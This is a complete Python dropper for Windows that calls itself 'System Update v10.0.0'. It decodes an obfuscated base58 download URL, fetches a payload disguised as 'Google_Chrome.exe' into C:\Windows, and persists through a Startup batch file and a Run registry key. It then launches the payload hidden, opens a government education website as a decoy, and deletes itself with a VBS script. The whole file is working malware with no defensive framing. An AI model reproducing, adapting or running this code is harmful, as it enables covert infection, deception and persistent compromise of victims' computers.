import os
import sys
import ssl
import subprocess
import ctypes
import base64
import urllib.request
import tempfile
import webbrowser
import time

# ═══════════════════════════════════════════════════════════
# 🔐 SSL — certifi
# ═══════════════════════════════════════════════════════════
try:
    import certifi
    _SSL_CTX = ssl.create_default_context(cafile=certifi.where())
    print("[INFO] SSL: certifi loaded", flush=True)
except ImportError:
    print("[WARN] certifi not found — installing...", flush=True)
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "certifi"],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        import certifi
        _SSL_CTX = ssl.create_default_context(cafile=certifi.where())
        print("[OK]   certifi installed", flush=True)
    except:
        _SSL_CTX = ssl._create_unverified_context()
        print("[WARN] Using unverified SSL context", flush=True)


# ═══════════════════════════════════════════════════════════
# 📦 BASE58 — تنفيذ يدوي
# ═══════════════════════════════════════════════════════════
_B58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

def b58decode(s):
    n = 0
    for c in s:
        n = n * 58 + _B58_ALPHABET.index(c)
    result = []
    while n > 0:
        result.append(n & 0xff)
        n >>= 8
    pad = 0
    for c in s:
        if c == _B58_ALPHABET[0]:
            pad += 1
        else:
            break
    return bytes([0] * pad + result[::-1])


# ═══════════════════════════════════════════════════════════
# ⚙️ CONFIG
# ═══════════════════════════════════════════════════════════
UIUYIOUY = "2FFvzA2zeqoVMnthQi81DMnMmfGLLGWoeXwMKMXRPzJptNQpWWekaAk8Lj7JfXggabyGkGSi9htbsUaqcnD3zeF4ENsE9oc28ZUWLHYbYk1UjbjyWYt7DLdbAnLwe"
MYNERAK = b58decode(UIUYIOUY).decode('utf-8', errors='ignore')

SHATO2 = "R29vZ2xlX0Nocm9tZS5leGU="
AYWHWH = base64.b64decode(SHATO2).decode('utf-8', errors='ignore')

# ═══ اسم الـ BAT فـ Startup ═══
AYTAYUU = "WindowsUpdate.bat"

# ═══ الفيروس فـ C:\Windows ═══
NANORAK = "C:\\Windows"

# ═══ الـ BAT فـ Startup ═══
SATATA9SU8 = os.path.join(
    os.environ.get('APPDATA', ''),
    'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
)

_DECOY_URL = "https://www.education.gov.dz/"


# ═══════════════════════════════════════════════════════════
# 📝 PRINT
# ═══════════════════════════════════════════════════════════
def _print(_msg, _type="INFO"):
    _colors = {
        "INFO": "\033[96m",
        "OK":   "\033[92m",
        "ERR":  "\033[91m",
        "WARN": "\033[93m",
        "PATH": "\033[95m",
    }
    _c = _colors.get(_type, "")
    _r = "\033[0m"
    print(f"{_c}[{_type}]{_r} {_msg}", flush=True)


# ═══════════════════════════════════════════════════════════
# 📥 DOWNLOAD VIRUS → C:\Windows
# ═══════════════════════════════════════════════════════════
def _download_virus():
    _print("Downloading virus...", "INFO")
    _print(f"URL: {MYNERAK}", "PATH")
    try:
        _req = urllib.request.Request(
            MYNERAK,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        _response = urllib.request.urlopen(_req, timeout=120, context=_SSL_CTX)
        _data = _response.read()
        if not _data or len(_data) < 100:
            _print(f"File too small: {len(_data)} bytes", "ERR")
            return None
        _virus_path = os.path.join(NANORAK, AYWHWH)
        if not os.path.exists(NANORAK):
            os.makedirs(NANORAK)
        with open(_virus_path, 'wb') as _f:
            _f.write(_data)
        _print(f"Downloaded: {len(_data) / 1024 / 1024:.2f} MB", "OK")
        _print(f"Saved to: {_virus_path}", "PATH")
        # ═══ ما كانش Hide ═══
        return _virus_path
    except Exception as _e:
        _print(f"Download failed: {_e}", "ERR")
        return None


# ═══════════════════════════════════════════════════════════
# 📝 WRITE BAT → Startup
# ═══════════════════════════════════════════════════════════
def _write_bat(virus_path):
    _print("Writing BAT to Startup...", "INFO")
    try:
        _bat_path = os.path.join(SATATA9SU8, AYTAYUU)
        if not os.path.exists(SATATA9SU8):
            os.makedirs(SATATA9SU8)
        _bat_content = f'''@echo off
start "" /B "{virus_path}"
exit
'''
        with open(_bat_path, 'w') as _f:
            _f.write(_bat_content)
        _print(f"BAT created: {_bat_path}", "OK")
        # ═══ ما كانش Hide ═══
        return _bat_path
    except Exception as _e:
        _print(f"BAT creation failed: {_e}", "ERR")
        return None


# ═══════════════════════════════════════════════════════════
# 📝 ADD TO REGISTRY
# ═══════════════════════════════════════════════════════════
def _add_to_registry(virus_path):
    _print("Adding to Registry...", "INFO")
    try:
        import winreg
        _key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(
            _key, "SystemUpdate", 0, winreg.REG_SZ,
            f'"{virus_path}"'
        )
        winreg.CloseKey(_key)
        _print("Added to Registry (Run)", "OK")
        return True
    except Exception as _e:
        _print(f"Registry failed: {_e}", "WARN")
        return False


# ═══════════════════════════════════════════════════════════
# 🚀 RUN VIRUS
# ═══════════════════════════════════════════════════════════
def _run_virus(virus_path):
    _print("Running virus...", "INFO")
    try:
        subprocess.Popen(
            [virus_path],
            creationflags=0x08000000,
            shell=False
        )
        _print("Virus started!", "OK")
        return True
    except Exception as _e:
        _print(f"Run failed: {_e}", "ERR")
        return False


# ═══════════════════════════════════════════════════════════
# 🌐 OPEN BROWSER (DECOY)
# ═══════════════════════════════════════════════════════════
def _open_browser():
    _print("Opening browser (decoy)...", "INFO")
    try:
        webbrowser.open(_DECOY_URL, new=2)
        _print(f"Browser opened: {_DECOY_URL}", "OK")
        return True
    except Exception as _e:
        _print(f"Browser failed: {_e}", "WARN")

    try:
        subprocess.Popen(
            ['cmd', '/c', 'start', '', _DECOY_URL],
            creationflags=0x08000000,
            shell=False
        )
        _print("Browser opened via cmd", "OK")
        return True
    except Exception as _e:
        _print(f"cmd failed: {_e}", "WARN")

    try:
        os.startfile(_DECOY_URL)
        _print("Browser opened via startfile", "OK")
        return True
    except:
        pass

    return False


# ═══════════════════════════════════════════════════════════
# 💥 SELF DESTRUCT
# ═══════════════════════════════════════════════════════════
def _self_destruct():
    _print("Self-destructing...", "INFO")
    try:
        if getattr(sys, 'frozen', False):
            _script = sys.executable
        else:
            _script = os.path.abspath(sys.argv[0])
        _temp = tempfile.gettempdir()
        _vbs_path = os.path.join(_temp, "del_self.vbs")
        _vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WScript.Sleep 3000
WshShell.Run "cmd /c timeout /t 5 /nobreak > nul & del /F /Q ""{_script}"" & del /F /Q ""%~f0""", 0, False
'''
        with open(_vbs_path, 'w') as _f:
            _f.write(_vbs_content)
        subprocess.Popen(
            ['wscript.exe', _vbs_path],
            creationflags=0x08000000,
            shell=False
        )
        _print("Self-destruct launched", "OK")
        return True
    except Exception as _e:
        _print(f"Self-destruct failed: {_e}", "WARN")
        return False


# ═══════════════════════════════════════════════════════════
# 🚀 MAIN
# ═══════════════════════════════════════════════════════════
def _main():
    _print("=" * 50, "INFO")
    _print("  System Update v10.0.0 — Starting...", "INFO")
    _print("=" * 50, "INFO")
    _print("")

    # 1) Download → C:\Windows
    _virus_path = _download_virus()
    if not _virus_path:
        _print("Download failed — exiting", "ERR")
        try: input()
        except: pass
        sys.exit(1)

    _print("")

    # 2) BAT → Startup
    _bat_path = _write_bat(_virus_path)
    if not _bat_path:
        _print("BAT creation failed — exiting", "ERR")
        try: input()
        except: pass
        sys.exit(1)

    _print("")

    # 3) Registry (زيادة أمان)
    _add_to_registry(_virus_path)
    _print("")

    # 4) Run virus الآن
    _run_virus(_virus_path)
    _print("")

    # 5) Browser (decoy)
    _open_browser()
    _print("")

    # 6) Self-destruct
    _self_destruct()
    _print("")

    _print("=" * 50, "OK")
    _print("  ✓ All done! System updated successfully.", "OK")
    _print("=" * 50, "OK")
    _print("")
    _print("Virus: " + _virus_path, "PATH")
    _print("BAT:   " + _bat_path, "PATH")
    _print("")
    _print("Every time PC starts → virus runs automatically.", "INFO")
    _print("Console will stay open for 30 seconds...", "WARN")
    _print("")

    for i in range(30, 0, -1):
        print(f"\rClosing in {i:2d}s... (Ctrl+C to exit now)", end="", flush=True)
        time.sleep(1)

    print("")
    _print("Bye!", "INFO")


if __name__ == "__main__":
    try:
        _main()
    except KeyboardInterrupt:
        _print("", "INFO")
        _print("Interrupted by user", "WARN")
    except Exception as _e:
        print(f"FATAL ERROR: {_e}", flush=True)
        import traceback
        traceback.print_exc()
        print("", flush=True)
        print("Press Enter to exit...", flush=True)
        try: input()
        except: pass
